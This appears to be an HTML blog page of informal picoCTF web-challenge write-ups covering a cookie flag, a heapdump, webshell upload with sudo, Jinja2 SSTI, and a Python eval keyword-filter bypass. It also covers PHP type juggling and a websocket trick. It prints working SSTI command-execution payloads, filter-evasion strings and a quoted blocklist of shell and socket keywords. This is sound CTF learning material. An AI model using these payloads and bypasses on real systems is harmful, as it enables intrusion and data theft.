@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>picoCTF / Web | Alvin Tran</title>
+<meta name="keywords" content="">
+<meta name="description" content="Cookie Monster Secret Recipe
+http://verbal-sleep.picoctf.net:56241/
+
+Logging on give hit &ldquo;Check cookies&rdquo;
+value secrent_recipe: cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzZDMkZCN0YzfQ%3D%3D
+As evident from the %3d%3d, most likely base64 encoded.
+Flag: picoCTF{c00k1e_m0nster_l0ves_c00kies_6C2FB7F3}
+
+head-dump
+
+Need to find enpoint  with flag
+Documentation about API
+&ldquo;browser_webshell_solvable&rdquo;
+
+
+So we have a home page with 4 blog posts of
+
+cyber
+nodejs/swagger ui / API documentation
+Logging
+and hacking
+
+
+None of the #links work, except for #API Docuemntation
+
+get a Swagger docuemtnation page
+
+heapdump gets memory
+You can open it in text file
+CTRL&#43;F &ldquo;picoCTF{&rdquo;
+picoCTF{Pat!3nt_15_Th3_K3y_ad7ea5ae
+
+
+
+
+
+n0s4n1ty 1
+
+profile picture upload
+need to locate file upload area, and inside /root directory.
+
+
+uploading file change image
+&ldquo;Update profile&rdquo; button gives &ldquo;File x.jpg has be uploaded Path: uplaods.jpg&rdquo;
+
+uploaded webshell.php, find we are in /var/www/html/uploads
+ls /root gives us Permission Denied
+
+Check sudo?
+We have sudo!
+
+
+sudo ls /root finds /root/flag,txt
+sudo cat /root/flag.txt
+picoCTF{wh47_c4n_u_d0_wPHP_d698d800}
+
+
+
+SSTI1
+
+announcer
+Whatever submitted in input box is then redirected to a page with jsut that text
+ca use &lt;script&gt; alert(5)&lt;/script&gt;
+what can we do then&hellip;
+post / with content redirects to /announce
+
+
+Try PHP innject
+
+&lt;?php echo &quot;test&quot; ?&gt;
+It gets automatically commented out -&gt; &lt;?php tunrs into &lt;!---?php
+
+
+In the HTML, we can see a POST request get sent to /
+Lets open burpsuite
+Be stupid and lookup what SSTI means
+
+Server Side Template injection
+Using {{}} we can evaluate the command
+{{7*7}} gives up 49 instead of the output!
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+
+We find it is a Jinja2 injection
+
+
+
+{{ request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls&#39;).read() }}
+{{request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat flag&#39;).read()}}
+WebSockFish
+stockfish chessbot!">
+<meta name="author" content="">
+<link rel="canonical" href="https://alvintran.net/writeups/picoctf/web/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d58a2cd75704c66c78a0fc5243a03bbe60ba774fe024c6bd4771f411afc45cce.css" integrity="sha256-1Yos11cExmx4oPxSQ6A7vmC6d0/gJMa9R3H0Ea/EXM4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://alvintran.net/images/favicon-16x16.png">
+<link rel="apple-touch-icon" href="https://alvintran.net/apple-touch-icon.png">
+<link rel="alternate" hreflang="en" href="https://alvintran.net/writeups/picoctf/web/">
+
+<meta name="twitter:title" content="picoCTF / Web | Alvin Tran" />
+<meta name="twitter:description" content="Cookie Monster Secret Recipe
+http://verbal-sleep.picoctf.net:56241/
+
+Logging on give hit &ldquo;Check cookies&rdquo;
+value secrent_recipe: cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzZDMkZCN0YzfQ%3D%3D
+As evident from the %3d%3d, most likely base64 encoded.
+Flag: picoCTF{c00k1e_m0nster_l0ves_c00kies_6C2FB7F3}
+
+head-dump
+
+Need to find enpoint  with flag
+Documentation about API
+&ldquo;browser_webshell_solvable&rdquo;
+
+
+So we have a home page with 4 blog posts of
+
+cyber
+nodejs/swagger ui / API documentation
+Logging
+and hacking
+
+
+None of the #links work, except for #API Docuemntation
+
+get a Swagger docuemtnation page
+
+heapdump gets memory
+You can open it in text file
+CTRL&#43;F &ldquo;picoCTF{&rdquo;
+picoCTF{Pat!3nt_15_Th3_K3y_ad7ea5ae
+
+
+
+
+
+n0s4n1ty 1
+
+profile picture upload
+need to locate file upload area, and inside /root directory.
+
+
+uploading file change image
+&ldquo;Update profile&rdquo; button gives &ldquo;File x.jpg has be uploaded Path: uplaods.jpg&rdquo;
+
+uploaded webshell.php, find we are in /var/www/html/uploads
+ls /root gives us Permission Denied
+
+Check sudo?
+We have sudo!
+
+
+sudo ls /root finds /root/flag,txt
+sudo cat /root/flag.txt
+picoCTF{wh47_c4n_u_d0_wPHP_d698d800}
+
+
+
+SSTI1
+
+announcer
+Whatever submitted in input box is then redirected to a page with jsut that text
+ca use &lt;script&gt; alert(5)&lt;/script&gt;
+what can we do then&hellip;
+post / with content redirects to /announce
+
+
+Try PHP innject
+
+&lt;?php echo &quot;test&quot; ?&gt;
+It gets automatically commented out -&gt; &lt;?php tunrs into &lt;!---?php
+
+
+In the HTML, we can see a POST request get sent to /
+Lets open burpsuite
+Be stupid and lookup what SSTI means
+
+Server Side Template injection
+Using {{}} we can evaluate the command
+{{7*7}} gives up 49 instead of the output!
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+
+We find it is a Jinja2 injection
+
+
+
+{{ request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls&#39;).read() }}
+{{request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat flag&#39;).read()}}
+WebSockFish
+stockfish chessbot!" />
+<meta property="og:title" content="picoCTF / Web | Alvin Tran" />
+<meta property="og:description" content="Cookie Monster Secret Recipe
+http://verbal-sleep.picoctf.net:56241/
+
+Logging on give hit &ldquo;Check cookies&rdquo;
+value secrent_recipe: cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzZDMkZCN0YzfQ%3D%3D
+As evident from the %3d%3d, most likely base64 encoded.
+Flag: picoCTF{c00k1e_m0nster_l0ves_c00kies_6C2FB7F3}
+
+head-dump
+
+Need to find enpoint  with flag
+Documentation about API
+&ldquo;browser_webshell_solvable&rdquo;
+
+
+So we have a home page with 4 blog posts of
+
+cyber
+nodejs/swagger ui / API documentation
+Logging
+and hacking
+
+
+None of the #links work, except for #API Docuemntation
+
+get a Swagger docuemtnation page
+
+heapdump gets memory
+You can open it in text file
+CTRL&#43;F &ldquo;picoCTF{&rdquo;
+picoCTF{Pat!3nt_15_Th3_K3y_ad7ea5ae
+
+
+
+
+
+n0s4n1ty 1
+
+profile picture upload
+need to locate file upload area, and inside /root directory.
+
+
+uploading file change image
+&ldquo;Update profile&rdquo; button gives &ldquo;File x.jpg has be uploaded Path: uplaods.jpg&rdquo;
+
+uploaded webshell.php, find we are in /var/www/html/uploads
+ls /root gives us Permission Denied
+
+Check sudo?
+We have sudo!
+
+
+sudo ls /root finds /root/flag,txt
+sudo cat /root/flag.txt
+picoCTF{wh47_c4n_u_d0_wPHP_d698d800}
+
+
+
+SSTI1
+
+announcer
+Whatever submitted in input box is then redirected to a page with jsut that text
+ca use &lt;script&gt; alert(5)&lt;/script&gt;
+what can we do then&hellip;
+post / with content redirects to /announce
+
+
+Try PHP innject
+
+&lt;?php echo &quot;test&quot; ?&gt;
+It gets automatically commented out -&gt; &lt;?php tunrs into &lt;!---?php
+
+
+In the HTML, we can see a POST request get sent to /
+Lets open burpsuite
+Be stupid and lookup what SSTI means
+
+Server Side Template injection
+Using {{}} we can evaluate the command
+{{7*7}} gives up 49 instead of the output!
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+
+We find it is a Jinja2 injection
+
+
+
+{{ request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls&#39;).read() }}
+{{request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat flag&#39;).read()}}
+WebSockFish
+stockfish chessbot!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://alvintran.net/writeups/picoctf/web/" />
+<meta property="article:section" content="writeups" />
+  <meta property="article:published_time" content="2025-04-01T02:16:51&#43;00:00" />
+  <meta property="article:modified_time" content="2025-04-01T02:16:51&#43;00:00" />
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://alvintran.net/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "picoCTF",
+      "item": "https://alvintran.net/writeups/picoctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "picoCTF / Web",
+      "item": "https://alvintran.net/writeups/picoctf/web/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "picoCTF / Web | Alvin Tran",
+  "name": "picoCTF \/ Web",
+  "description": "Cookie Monster Secret Recipe http://verbal-sleep.picoctf.net:56241/\nLogging on give hit \u0026ldquo;Check cookies\u0026rdquo; value secrent_recipe: cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzZDMkZCN0YzfQ%3D%3D As evident from the %3d%3d, most likely base64 encoded. Flag: picoCTF{c00k1e_m0nster_l0ves_c00kies_6C2FB7F3} head-dump Need to find enpoint with flag Documentation about API \u0026ldquo;browser_webshell_solvable\u0026rdquo; So we have a home page with 4 blog posts of cyber nodejs/swagger ui / API documentation Logging and hacking None of the #links work, except for #API Docuemntation get a Swagger docuemtnation page heapdump gets memory You can open it in text file CTRL+F \u0026ldquo;picoCTF{\u0026rdquo; picoCTF{Pat!3nt_15_Th3_K3y_ad7ea5ae n0s4n1ty 1 profile picture upload need to locate file upload area, and inside /root directory. uploading file change image \u0026ldquo;Update profile\u0026rdquo; button gives \u0026ldquo;File x.jpg has be uploaded Path: uplaods.jpg\u0026rdquo; uploaded webshell.php, find we are in /var/www/html/uploads ls /root gives us Permission Denied Check sudo? We have sudo! sudo ls /root finds /root/flag,txt sudo cat /root/flag.txt picoCTF{wh47_c4n_u_d0_wPHP_d698d800} SSTI1 announcer Whatever submitted in input box is then redirected to a page with jsut that text ca use \u0026lt;script\u0026gt; alert(5)\u0026lt;/script\u0026gt; what can we do then\u0026hellip; post / with content redirects to /announce Try PHP innject \u0026lt;?php echo \u0026quot;test\u0026quot; ?\u0026gt; It gets automatically commented out -\u0026gt; \u0026lt;?php tunrs into \u0026lt;!---?php In the HTML, we can see a POST request get sent to / Lets open burpsuite Be stupid and lookup what SSTI means Server Side Template injection Using {{}} we can evaluate the command {{7*7}} gives up 49 instead of the output! https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection We find it is a Jinja2 injection {{ request.application.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read() }} {{request.application.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat flag\u0026#39;).read()}} WebSockFish stockfish chessbot!\n",
+  "keywords": [
+    
+  ],
+  "wordCount" : "712",
+  "inLanguage": "en",
+  "datePublished": "2025-04-01T02:16:51Z",
+  "dateModified": "2025-04-01T02:16:51Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://alvintran.net/writeups/picoctf/web/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Alvin Tran",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://alvintran.net/images/favicon-16x16.png"
+    }
+  }
+}
+</script>
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+
+</head>
+
+<body class=" dark type-writeups kind-page layout-" id="top"><script data-no-instant>
+function switchTheme(theme) {
+  switch (theme) {
+    case 'light':
+      document.body.classList.remove('dark');
+      break;
+    case 'dark':
+      document.body.classList.add('dark');
+      break;
+    
+    default:
+      if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+      }
+  }
+}
+
+function isDarkTheme() {
+  return document.body.className.includes("dark");
+}
+
+function getPrefTheme() {
+  return localStorage.getItem("pref-theme");
+}
+
+function setPrefTheme(theme) {
+  switchTheme(theme)
+  localStorage.setItem("pref-theme", theme);
+}
+
+const toggleThemeCallbacks = {}
+toggleThemeCallbacks['main'] = (isDark) => {
+  
+  if (isDark) {
+    setPrefTheme('light');
+  } else {
+    setPrefTheme('dark');
+  }
+}
+
+
+
+
+window.addEventListener('toggle-theme', function() {
+  
+  const isDark = isDarkTheme()
+  for (const key in toggleThemeCallbacks) {
+    toggleThemeCallbacks[key](isDark)
+  }
+});
+
+
+function toggleThemeListener() {
+  
+  window.dispatchEvent(new CustomEvent('toggle-theme'));
+}
+
+</script>
+<script>
+  
+  (function() {
+    const defaultTheme = 'dark';
+    const prefTheme = getPrefTheme();
+    const theme = prefTheme ? prefTheme : defaultTheme;
+
+    switchTheme(theme);
+  })();
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://alvintran.net/" accesskey="h" title="Alvin Tran (Alt + H)">Alvin Tran</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://alvintran.net/" title="Home" class="active"
+                >Home
+                </a>
+            </li>
+            <li>
+                <a href="https://alvintran.net/homelab/" title="Homelab"
+                >Homelab
+                </a>
+            </li>
+            <li>
+                <a href="https://alvintran.net/writeups/" title="Writeups" class="active"
+                >Writeups
+                </a>
+            </li>
+            <li>
+                <a href="https://alvintran.net/status/" title="Status"
+                >Status
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main post">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title">picoCTF / Web</h1>
+    <div class="post-meta"><span class="meta-item">
+  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar" style="user-select: text;"><rect x="3" y="4" width="18" height="18" rx="2" ry="2" style="user-select: text;"></rect><line x1="16" y1="2" x2="16" y2="6" style="user-select: text;"></line><line x1="8" y1="2" x2="8" y2="6" style="user-select: text;"></line><line x1="3" y1="10" x2="21" y2="10" style="user-select: text;"></line></svg>
+  <span>April 1, 2025</span></span><span class="meta-item">
+  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar" style="user-select: text;"><rect x="3" y="4" width="18" height="18" rx="2" ry="2" style="user-select: text;"></rect><line x1="16" y1="2" x2="16" y2="6" style="user-select: text;"></line><line x1="8" y1="2" x2="8" y2="6" style="user-select: text;"></line><line x1="3" y1="10" x2="21" y2="10" style="user-select: text;"></line></svg>
+  <span>April 1, 2025</span></span>
+
+      
+      
+    </div>
+  </header> 
+  <div class="post-content"><h1 id="cookie-monster-secret-recipe">Cookie Monster Secret Recipe<a hidden class="anchor" aria-hidden="true" href="#cookie-monster-secret-recipe">¶</a></h1>
+<p><a href="http://verbal-sleep.picoctf.net:56241/">http://verbal-sleep.picoctf.net:56241/</a></p>
+<ol>
+<li>Logging on give hit &ldquo;Check cookies&rdquo;</li>
+<li>value <code>secrent_recipe: cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzZDMkZCN0YzfQ%3D%3D</code></li>
+<li>As evident from the %3d%3d, most likely base64 encoded.</li>
+<li>Flag: picoCTF{c00k1e_m0nster_l0ves_c00kies_6C2FB7F3}</li>
+</ol>
+<h1 id="head-dump">head-dump<a hidden class="anchor" aria-hidden="true" href="#head-dump">¶</a></h1>
+<ul>
+<li>Need to find enpoint  with flag</li>
+<li>Documentation about API</li>
+<li>&ldquo;browser_webshell_solvable&rdquo;</li>
+</ul>
+<ol>
+<li>So we have a home page with 4 blog posts of
+<ol>
+<li>cyber</li>
+<li>nodejs/swagger ui / API documentation</li>
+<li>Logging</li>
+<li>and hacking</li>
+</ol>
+</li>
+<li>None of the #links work, except for <code>#API Docuemntation</code>
+<ol>
+<li>get a Swagger docuemtnation page
+<ol>
+<li>heapdump gets memory</li>
+<li>You can open it in text file</li>
+<li>CTRL+F &ldquo;picoCTF{&rdquo;</li>
+<li>picoCTF{Pat!3nt_15_Th3_K3y_ad7ea5ae</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h1 id="n0s4n1ty-1">n0s4n1ty 1<a hidden class="anchor" aria-hidden="true" href="#n0s4n1ty-1">¶</a></h1>
+<ul>
+<li>profile picture upload</li>
+<li>need to locate file upload area, and inside /root directory.</li>
+</ul>
+<ol>
+<li>uploading file change image</li>
+<li>&ldquo;Update profile&rdquo; button gives &ldquo;File x.jpg has be uploaded Path: uplaods.jpg&rdquo;
+<ol>
+<li>uploaded <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php">webshell.php</a>, find we are in /var/www/html/uploads</li>
+<li>ls /root gives us <code>Permission Denied</code>
+<ol>
+<li>Check sudo?</li>
+<li>We have sudo!</li>
+</ol>
+</li>
+<li>sudo ls /root finds /root/flag,txt</li>
+<li>sudo cat /root/flag.txt</li>
+<li>picoCTF{wh47_c4n_u_d0_wPHP_d698d800}</li>
+</ol>
+</li>
+</ol>
+<h1 id="ssti1">SSTI1<a hidden class="anchor" aria-hidden="true" href="#ssti1">¶</a></h1>
+<ul>
+<li>announcer</li>
+<li>Whatever submitted in input box is then redirected to a page with jsut that text</li>
+<li>ca use <code>&lt;script&gt; alert(5)&lt;/script&gt;</code></li>
+<li>what can we do then&hellip;</li>
+<li>post / with content redirects to /announce</li>
+</ul>
+<ol>
+<li>Try PHP innject
+<ol>
+<li><code>&lt;?php echo &quot;test&quot; ?&gt;</code></li>
+<li>It gets automatically commented out -&gt; <code>&lt;?php</code> tunrs into <code>&lt;!---?php</code></li>
+</ol>
+</li>
+<li>In the HTML, we can see a POST request get sent to /</li>
+<li>Lets open burpsuite</li>
+<li>Be stupid and lookup what SSTI means
+<ol>
+<li>Server Side Template injection</li>
+<li>Using {{}} we can evaluate the command</li>
+<li>{{7*7}} gives up 49 instead of the output!</li>
+</ol>
+</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a>
+<ol>
+<li>We find it is a Jinja2 injection</li>
+</ol>
+</li>
+</ol>
+<pre tabindex="0"><code>{{ request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls&#39;).read() }}
+{{request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat flag&#39;).read()}}
+</code></pre><h1 id="websockfish">WebSockFish<a hidden class="anchor" aria-hidden="true" href="#websockfish">¶</a></h1>
+<p>stockfish chessbot!</p>
+<ol>
+<li>In the script, we can see how the game is ran and how out fish chat messages are sent</li>
+<li>The chess/chessboard/stockfish .js files are pretty standard open source stuff</li>
+<li>We look at the websock, which gives uses:
+<ol>
+<li>sendMessage() to send data to websocket</li>
+<li>and appropiate updateMEssage() our fish dialog</li>
+</ol>
+</li>
+<li>On the bottom, we see that the scripts use this on the stockfish.onmessage() event
+<ol>
+<li>sf.postMEssage() evaluates the chess engine to get a response</li>
+<li>then, depending on the response, we either perform the best move OR send a message to the websocket
+<ol>
+<li>The two messages are &ldquo;mate x&rdquo; and &ldquo;eval x&rdquo;</li>
+<li>&ldquo;mate x&rdquo; looks like how soon the fish kills you</li>
+<li>&ldquo;eval x&rdquo; determines the position&hellip; i.e &ldquo;i&rsquo;m winning&rdquo; or &ldquo;i&rsquo;m losing&rdquo; or &ldquo;its even&rdquo;</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>If you sendMessage(&ldquo;eval -9999&rdquo;) we get our flag&quot;</li>
+</ol>
+<h1 id="3vl">3v@l<a hidden class="anchor" aria-hidden="true" href="#3vl">¶</a></h1>
+<p>Under the hood, there is an eval function from python
+figure out how to execute bad code!</p>
+<ol>
+<li>tried import os -&gt; there are banlist words</li>
+<li>even &ldquo;os&rdquo; as a string doesn&rsquo;t work</li>
+<li>I&rsquo;m stupid and its in an html comment</li>
+</ol>
+<pre tabindex="0"><code>    TODO
+    ------------
+    Secure python_flask eval execution by 
+        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
+        2.Implementing regex: r&#39;0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.&#39;
+</code></pre><p>we can instead use the <code>__import__()</code> function to get the libraries we need. We can sue them using strings. Normally, you&rsquo;d need to put <code>import os</code>, where os is a keyterm. not we can do <code>__import__(&quot;o&quot; + &quot;s&quot;)</code>, then add <code>.listdir()</code> to see our directory</p>
+<p>we also have access to t he <code>open().read()</code> functions. We can read the flask file with:
+<code>open('app' + '.' + &quot;py&quot;).read()</code></p>
+<p>Note: we can&rsquo;t put t&quot;.&quot; with another letter as it will yell at us</p>
+<p><strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).listdir(&quot;/flag.txt&quot;)
+<strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).listdir(&quot;~&quot;)
+<strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).listdir(<strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).sep)
+<strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).listdir(<strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).path.abspath(&quot;.&quot;+ &ldquo;.&rdquo;) + &ldquo;flag&rdquo; + &ldquo;.&rdquo; + &ldquo;txt&rdquo;)
+open(<strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).path.abspath(&quot;.&quot;+ &ldquo;.&rdquo;) + &ldquo;flag&rdquo; + &ldquo;.&rdquo; + &ldquo;txt&rdquo;).read()</p>
+<h1 id="ssti2">SSTI2<a hidden class="anchor" aria-hidden="true" href="#ssti2">¶</a></h1>
+<p>Same set up</p>
+<ul>
+<li>some tests</li>
+<li><code>{{ xxxx }}</code> still works</li>
+<li>function give server error</li>
+<li>{{ 1.1 }} shows 11, which means . is removed.</li>
+<li>() still work, but not within {} -&gt; seems to be stripped?
+<ul>
+<li>except () together works. only ( breaks</li>
+</ul>
+</li>
+<li>__ are stripped</li>
+<li>{{ config }} gets outputs</li>
+<li>periodds are removed, so are []</li>
+<li><a href="https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html#common-bypasses">https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html#common-bypasses</a></li>
+</ul>
+<pre tabindex="0"><code>{%with a=request|attr(&#34;application&#34;)|attr(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\x5f\x5fbuiltins\x5f\x5f&#34;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;cat flag${IFS}&#39;)|attr(&#39;read&#39;)()%}{%print(a)%}{%endwith%}
+</code></pre><h1 id="apriti-sesame-street">apriti sesame street<a hidden class="anchor" aria-hidden="true" href="#apriti-sesame-street">¶</a></h1>
+<p><a href="https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4">https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4</a></p>
+<ul>
+<li>hint says backup files from emacs</li>
+<li>emacs saves edited files as <code>filename.txt~</code>
+<ul>
+<li>we can tehn find the logic of the hpp in <code>impossibleLogin.php</code></li>
+</ul>
+</li>
+<li>refer to link above</li>
+<li>payload is <code>username[]=a&amp;pwd[]=b</code> in body
+<ul>
+<li>[] turns the value into an array, which sha1 tries to cast into a string and then returns 0.
+Intersting notes:</li>
+</ul>
+</li>
+<li>php == is vulenrable to a lot of things</li>
+<li>md5 collisions when doing (md5) == (md5) sisnces strings starting with 0e are treated as 0.</li>
+<li>you can also type juggle strcmp
+<a href="https://rst.hashnode.dev/bypassing-php-strcmp">https://rst.hashnode.dev/bypassing-php-strcmp</a></li>
+</ul>
+<h1 id="pachinko">Pachinko<a hidden class="anchor" aria-hidden="true" href="#pachinko">¶</a></h1>
+<ul>
+<li>I actually have 0 clue what i did but i connected 8-4-7.</li>
+</ul>
+
+
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+    <div class="comments-separator"></div>
+</article>
+    </main>
+    
+<footer class="footer">
+  <span>&copy; 2025 <a href="https://alvintran.net/">Alvin Tran</a></span><span style="display: inline-block; margin-left: 1em;">
+    <a href="https://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA</a>
+  </span>
+  <span style="display: inline-block; margin-left: 1em;">
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+    <a href="https://github.com/reorx/hugo-PaperModX/" rel="noopener" target="_blank">PaperModX</a>
+  </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+    <path d="M12 6H0l6-6z" />
+  </svg>
+</a>
+
+<script>
+  (function() {
+     
+    const disableThemeToggle = '' == '1';
+    if (disableThemeToggle) {
+      return;
+    }
+
+    let button = document.getElementById("theme-toggle")
+    
+    button.removeEventListener('click', toggleThemeListener)
+    
+    button.addEventListener('click', toggleThemeListener)
+  })();
+</script>
+
+<script>
+  (function () {
+    let menu = document.getElementById('menu')
+    if (menu) {
+      menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+      menu.onscroll = function () {
+        localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+      }
+    }
+
+    const disableSmoothScroll = '' == '1';
+    const enableInstantClick = '' == '1';
+    
+    if (window.matchMedia('(prefers-reduced-motion: reduce)').matches || disableSmoothScroll || enableInstantClick) {
+      return;
+    }
+    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener("click", function (e) {
+        e.preventDefault();
+        var id = this.getAttribute("href").substr(1);
+        document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+          behavior: "smooth"
+        });
+        if (id === "top") {
+          history.replaceState(null, null, " ");
+        } else {
+          history.pushState(null, null, `#${id}`);
+        }
+      });
+    });
+  })();
+</script>
+<script>
+  var mybutton = document.getElementById("top-link");
+  window.onscroll = function () {
+    if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+      mybutton.style.visibility = "visible";
+      mybutton.style.opacity = "1";
+    } else {
+      mybutton.style.visibility = "hidden";
+      mybutton.style.opacity = "0";
+    }
+  };
+</script>
+<script>
+  document.querySelectorAll('.masked-email').forEach((el) => {
+    el.innerText = atob(el.innerText);
+    el.classList.remove('masked-email')
+  })
+</script>
+<script>
+  if (window.scrollListeners) {
+    
+    for (const listener of scrollListeners) {
+      window.removeEventListener('scroll', listener)
+    }
+  }
+  window.scrollListeners = []
+</script>
+
+
+
+<script src="/js/medium-zoom.min.js" data-no-instant
+></script>
+
+
+
+
+<script>
+  
+  
+  (function() {
+    const enableTocScroll = '' == '1'
+    if (!enableTocScroll) {
+      return
+    }
+    if (!document.querySelector('.toc')) {
+      console.log('no toc found, ignore toc scroll')
+      return
+    }
+    
+
+    
+    const scrollListeners = window.scrollListeners
+    const headings = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id]');
+    const activeClass = 'active';
+
+    
+    let activeHeading = headings[0];
+    getLinkByHeading(activeHeading).classList.add(activeClass);
+
+    const onScroll = () => {
+      const passedHeadings = [];
+      for (const h of headings) {
+        
+        if (getOffsetTop(h) < 5) {
+          passedHeadings.push(h)
+        } else {
+          break;
+        }
+      }
